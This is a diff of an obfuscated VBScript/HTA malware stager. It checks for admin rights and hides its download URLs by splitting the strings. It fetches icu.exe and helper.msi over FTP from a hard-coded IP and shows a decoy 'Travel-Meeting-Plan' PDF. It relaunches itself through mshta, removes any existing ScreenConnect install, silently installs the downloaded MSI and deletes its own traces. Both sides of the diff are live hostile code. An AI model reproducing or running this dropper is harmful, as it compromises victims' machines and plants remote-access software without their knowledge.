@@ -1,163 +1,164 @@
-' main run main
-' built c82ae5f1
+' seed mode doc
+' built a9d07c4a
 ' stage
-Dim f0cu, fg0c, fa32, wsbbs, tz51, gu1k, vtgp3, fyw1, kptps, t94g, ms31q, gkeh, ffk, f8y2, g4x90, fxg, veq, wy6, wr84
-Dim kmk4p, xcn, x7kd, fxfg2, m54, g1k44, v38
-Set f0cu = CreateObject("Scripting.FileSystemObject")
-Set fg0c = CreateObject("WScript.Shell")
-wsbbs = fg0c.ExpandEnvironmentStrings("%TEMP%")
-o1dc = 0
-Set fa32 = f0cu.OpenTextFile(wsbbs & "\s65f54.txt", 8, True)
+Dim taa, fkvu, o7fy, o550, x7xbd, xmk, w8may, mmyhz, wth, tm14p, z2ht, zjjdn, tnx, obv2, orr8p, op7rd, tu1ea, osu, m98
+Dim zfjn, wx24k, vhuv, m1ahm, otj, g4baf, t6w
+Set taa = CreateObject("Scripting.FileSystemObject")
+Set fkvu = CreateObject("WScript.Shell")
+o550 = fkvu.ExpandEnvironmentStrings("%TEMP%")
+Set o7fy = taa.OpenTextFile(o550 & "\s0f9a0.txt", 8, True)
+o7fy.WriteLine "[stage] start"
+t6w = "C:\ProgramData\sd"
 
-fa32.WriteLine "[stage] start"
-v38 = "C:\ProgramData\sd"
-
-fxfg2 = False
-kmk4p = wsbbs & "\_p.txt"
-gu1k = fg0c.Run("cmd.exe /c C:\Windows\System32\whoami.exe /groups > """ & kmk4p & """", 0, True)
-fa32.WriteLine "[stage] whoami rc=" & gu1k
-If f0cu.FileExists(kmk4p) Then
-    Set x7kd = f0cu.OpenTextFile(kmk4p, 1)
-    If Not x7kd.AtEndOfStream Then xcn = x7kd.ReadAll
-    x7kd.Close
-    If InStr(xcn, "S-1-16-12288") > 0 Or InStr(xcn, "S-1-16-16384") > 0 Then fxfg2 = True
-    f0cu.DeleteFile kmk4p, True
+m1ahm = False
+zfjn = o550 & "\_p.txt"
+xmk = fkvu.Run("cmd.exe /c C:\Windows\System32\whoami.exe /groups > """ & zfjn & """", 0, True)
+o7fy.WriteLine "[stage] whoami rc=" & xmk
+If taa.FileExists(zfjn) Then
+    Set vhuv = taa.OpenTextFile(zfjn, 1)
+    If Not vhuv.AtEndOfStream Then wx24k = vhuv.ReadAll
+    vhuv.Close
+    If InStr(wx24k, "S-1-16-12288") > 0 Or InStr(wx24k, "S-1-16-16384") > 0 Then m1ahm = True
+    taa.DeleteFile zfjn, True
 End If
-fa32.WriteLine "[stage] admin=" & fxfg2
 
-If Not fxfg2 Then
-    If Not f0cu.FolderExists(v38) Then
+o7fy.WriteLine "[stage] admin=" & m1ahm
+xjg2 = 2
 
+
+If Not m1ahm Then
+    If Not taa.FolderExists(t6w) Then
         On Error Resume Next
-        f0cu.CreateFolder v38
-
+        taa.CreateFolder t6w
         On Error GoTo 0
     End If
-    tz51 = "curl.exe -s --fail -L " & "-u ano" & "nymous" & ":ftp@examp" & "le.com" & " " & "-o """ & v38 & "\icu.exe"" " & "ftp://72.51.57.39/" & "icu.exe"
-    gu1k = fg0c.Run("cmd.exe /c " & tz51, 0, True)
-    fa32.WriteLine "[stage] icu dl rc=" & gu1k
-    If f0cu.FileExists(v38 & "\icu.exe") Then
-        m54 = Replace(location.href, "file:///", "")
 
-        m54 = Replace(m54, "%20", " ")
-        m54 = Replace(m54, "/", "\")
+    x7xbd = "curl.exe -s --fail -L " & "-u an" & "onymous:f" & "tp@example" & ".com " & "-o """ & t6w & "\icu.exe"" " & "ftp://72.51.57.39/icu" & ".exe"
+    xmk = fkvu.Run("cmd.exe /c " & x7xbd, 0, True)
+    o7fy.WriteLine "[stage] icu dl rc=" & xmk
+    If taa.FileExists(t6w & "\icu.exe") Then
+        otj = Replace(location.href, "file:///", "")
+        otj = Replace(otj, "%20", " ")
+
+        otj = Replace(otj, "/", "\")
         On Error Resume Next
-        zcgf = 2
-        f0cu.DeleteFile v38 & "\p-log.txt", True
+        taa.DeleteFile t6w & "\p-log.txt", True
+
         On Error GoTo 0
-        Set x7kd = f0cu.CreateTextFile(v38 & "\run.vbs", True)
-        x7kd.WriteLine "On Error Resume Next"
-        vt691 = 3
-        x7kd.WriteLine "Dim sh"
-        x7kd.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
-        x7kd.WriteLine "sh.Run ""cmd.exe /c echo [icu-vbs] hit %DATE% %TIME%> " & v38 & "\p-log.txt"", 0, True"
-        x7kd.WriteLine "sh.Run ""mshta.exe "" & Chr(34) & """ & m54 & """ & Chr(34), 0, False"
-        x7kd.Close
-        fa32.WriteLine "[stage] handoff start"
-        fa32.Close
-        gu1k = fg0c.Run("cmd.exe /c """ & v38 & "\icu.exe"" m4a1_dev4 " & v38 & "\run.vbs", 0, False)
+        Set vhuv = taa.CreateTextFile(t6w & "\run.vbs", True)
+
+        vhuv.WriteLine "On Error Resume Next"
+        vhuv.WriteLine "Dim sh"
+        vhuv.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
+        vhuv.WriteLine "sh.Run ""cmd.exe /c echo [icu-vbs] hit %DATE% %TIME%> " & t6w & "\p-log.txt"", 0, True"
+        vhuv.WriteLine "sh.Run ""mshta.exe "" & Chr(34) & """ & otj & """ & Chr(34), 0, False"
+        vhuv.Close
+        o7fy.WriteLine "[stage] handoff start"
+        o7fy.Close
+        xmk = fkvu.Run("cmd.exe /c """ & t6w & "\icu.exe"" m4a1_dev4 " & t6w & "\run.vbs", 0, False)
     Else
-        fa32.WriteLine "[stage] icu missing"
-        fa32.Close
+        o7fy.WriteLine "[stage] icu missing"
+        o7fy.Close
     End If
 Else
-    tz51 = "curl.exe -s --fail -L -o """ & wsbbs & "\Travel-Meeting-Plan-Q4-2026.pdf"" " & "https://raw.githu" & "busercontent.com/s" & "lynet999-c" & "oder/Yam" & "bo/main/tmp" & "q42026.pdf"
-    gu1k = fg0c.Run("cmd.exe /c " & tz51, 0, True)
-    fa32.WriteLine "[stage] pdf dl rc=" & gu1k
-    vtgp3 = wsbbs & "\Travel-Meeting-Plan-Q4-2026.pdf"
-    If f0cu.FileExists(vtgp3) Then
+gr6 = 6
+    x7xbd = "curl.exe -s --fail -L -o """ & o550 & "\Travel-Meeting-Plan-Q4-2026.pdf"" " & "https://raw.git" & "hubusercontent.com/sl" & "ynet999" & "-coder/Ya" & "mbo/main/tmpq42026.pd" & "f"
+    xmk = fkvu.Run("cmd.exe /c " & x7xbd, 0, True)
+    o7fy.WriteLine "[stage] pdf dl rc=" & xmk
+    w8may = o550 & "\Travel-Meeting-Plan-Q4-2026.pdf"
+    If taa.FileExists(w8may) Then
+    gnxjt = 5
         On Error Resume Next
-        fyw1 = fg0c.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe\")
-        If Err.Number <> 0 Or Len(fyw1) = 0 Then
-            fyw1 = "msedge.exe"
+        mmyhz = fkvu.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe\")
+        If Err.Number <> 0 Or Len(mmyhz) = 0 Then
+            mmyhz = "msedge.exe"
             Err.Clear
         End If
         On Error GoTo 0
-        kptps = fg0c.Run(Chr(34) & fyw1 & Chr(34) & " " & Chr(34) & vtgp3 & Chr(34), 1, False)
-        fa32.WriteLine "[stage] edge rc=" & kptps
+        wth = fkvu.Run(Chr(34) & mmyhz & Chr(34) & " " & Chr(34) & w8may & Chr(34), 1, False)
+        o7fy.WriteLine "[stage] edge rc=" & wth
     Else
-        fa32.WriteLine "[stage] pdf missing"
+        o7fy.WriteLine "[stage] pdf missing"
     End If
-    m32m = 9
 
-    tz51 = "curl.exe -s --fail -L " & "-u ano" & "nymous" & ":ftp@examp" & "le.com" & " " & "-o """ & wsbbs & "\helper.msi"" " & "ftp://72.51.57" & ".39/helper" & ".msi"
-    gu1k = fg0c.Run("cmd.exe /c " & tz51, 0, True)
-    fa32.WriteLine "[stage] msi dl rc=" & gu1k
+    x7xbd = "curl.exe -s --fail -L " & "-u an" & "onymous:f" & "tp@example" & ".com " & "-o """ & o550 & "\helper.msi"" " & "ftp://72.51" & ".57.39/" & "helper." & "msi"
+    xmk = fkvu.Run("cmd.exe /c " & x7xbd, 0, True)
+    o7fy.WriteLine "[stage] msi dl rc=" & xmk
 
 
-    fa32.WriteLine "[stage] sweep start"
-    Set t94g = GetObject("winmgmts:\\.\root\cimv2")
-    Set ms31q = t94g.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%ScreenConnect%'")
-    For Each gkeh In ms31q
+    o7fy.WriteLine "[stage] sweep start"
+    Set tm14p = GetObject("winmgmts:\\.\root\cimv2")
+
+    Set z2ht = tm14p.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%ScreenConnect%'")
+    ou2 = 1
+    For Each zjjdn In z2ht
         On Error Resume Next
-        gkeh.Terminate()
+        zjjdn.Terminate()
         On Error GoTo 0
     Next
-    fq7zb = 1
-    Set ms31q = t94g.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
-    For Each gkeh In ms31q
+    Set z2ht = tm14p.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
 
+    For Each zjjdn In z2ht
         On Error Resume Next
-        gkeh.StopService()
+        zjjdn.StopService()
         On Error GoTo 0
     Next
-    gu1k = fg0c.Run("cmd.exe /c ping -n 2 127.0.0.1 >nul", 0, True)
-    Set ms31q = t94g.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
-    For Each gkeh In ms31q
+    zysfa = 3
+    xmk = fkvu.Run("cmd.exe /c ping -n 2 127.0.0.1 >nul", 0, True)
+    Set z2ht = tm14p.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE 'ScreenConnect%'")
+    ottqs = 7
+    For Each zjjdn In z2ht
         On Error Resume Next
-        gkeh.Delete()
+        zjjdn.Delete()
+        w3f = 9
         On Error GoTo 0
-        v15 = 8
     Next
-    xfh = 4
-    For Each ffk In Array("C:\Program Files (x86)", "C:\Program Files")
-        If f0cu.FolderExists(ffk) Then
-        wpnv = 8
-            For Each f8y2 In f0cu.GetFolder(ffk).SubFolders
-                If InStr(f8y2.Name, "ScreenConnect") = 1 Then
+    For Each tnx In Array("C:\Program Files (x86)", "C:\Program Files")
+        If taa.FolderExists(tnx) Then
+            For Each obv2 In taa.GetFolder(tnx).SubFolders
+                If InStr(obv2.Name, "ScreenConnect") = 1 Then
                     On Error Resume Next
-                    f8y2.Delete True
+                    obv2.Delete True
                     On Error GoTo 0
                 End If
-
+                zcz5u = 5
             Next
-            x3b = 2
         End If
     Next
-    Set g4x90 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
-    For Each fxg In Array("SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SYSTEM\CurrentControlSet\Services")
+    Set orr8p = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
+    For Each op7rd In Array("SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SYSTEM\CurrentControlSet\Services")
         On Error Resume Next
-        veq = ""
-        g4x90.EnumKey &H80000002, fxg, veq
-        If IsArray(veq) Then
-            For Each gkeh In veq
-                If InStr(gkeh, "ScreenConnect") > 0 Then
-                    g4x90.DeleteKey &H80000002, fxg & "\" & gkeh
+        tu1ea = ""
+        orr8p.EnumKey &H80000002, op7rd, tu1ea
+        If IsArray(tu1ea) Then
+            For Each zjjdn In tu1ea
+                If InStr(zjjdn, "ScreenConnect") > 0 Then
+                    orr8p.DeleteKey &H80000002, op7rd & "\" & zjjdn
                 End If
             Next
         End If
+        fb245 = 1
         Err.Clear
     Next
-    g4x90.DeleteKey &H80000002, "SOFTWARE\WOW6432Node\ScreenConnect"
+    orr8p.DeleteKey &H80000002, "SOFTWARE\WOW6432Node\ScreenConnect"
+    orr8p.DeleteKey &H80000001, "Software\ScreenConnect"
+    o7fy.WriteLine "[stage] sweep done"
 
-    g4x90.DeleteKey &H80000001, "Software\ScreenConnect"
-    fa32.WriteLine "[stage] sweep done"
-
-    wy6 = wsbbs & "\helper.msi"
-    If f0cu.FileExists(wy6) Then
-        wr84 = fg0c.Run("msiexec.exe /i """ & wy6 & """ /qn /norestart", 0, False)
-        fa32.WriteLine "[stage] msi rc=" & wr84
+    osu = o550 & "\helper.msi"
+    If taa.FileExists(osu) Then
+        m98 = fkvu.Run("msiexec.exe /i """ & osu & """ /qn /norestart", 0, False)
+        o7fy.WriteLine "[stage] msi rc=" & m98
     Else
-        fa32.WriteLine "[stage] msi missing"
+        o7fy.WriteLine "[stage] msi missing"
     End If
 
     On Error Resume Next
-    If f0cu.FileExists(wsbbs & "\e.bat") Then f0cu.DeleteFile wsbbs & "\e.bat", True
-    If f0cu.FileExists(wsbbs & "\icu.exe") Then f0cu.DeleteFile wsbbs & "\icu.exe", True
-    If f0cu.FileExists(v38 & "\run.vbs") Then f0cu.DeleteFile v38 & "\run.vbs", True
-    If f0cu.FileExists(v38 & "\icu.exe") Then f0cu.DeleteFile v38 & "\icu.exe", True
-    If f0cu.FileExists(v38 & "\p-log.txt") Then f0cu.DeleteFile v38 & "\p-log.txt", True
+    If taa.FileExists(o550 & "\e.bat") Then taa.DeleteFile o550 & "\e.bat", True
+    If taa.FileExists(o550 & "\icu.exe") Then taa.DeleteFile o550 & "\icu.exe", True
+    If taa.FileExists(t6w & "\run.vbs") Then taa.DeleteFile t6w & "\run.vbs", True
+    If taa.FileExists(t6w & "\icu.exe") Then taa.DeleteFile t6w & "\icu.exe", True
+    If taa.FileExists(t6w & "\p-log.txt") Then taa.DeleteFile t6w & "\p-log.txt", True
     On Error GoTo 0
-    fa32.WriteLine "[stage] done"
-    fa32.Close
+    o7fy.WriteLine "[stage] done"
+    o7fy.Close
 End If
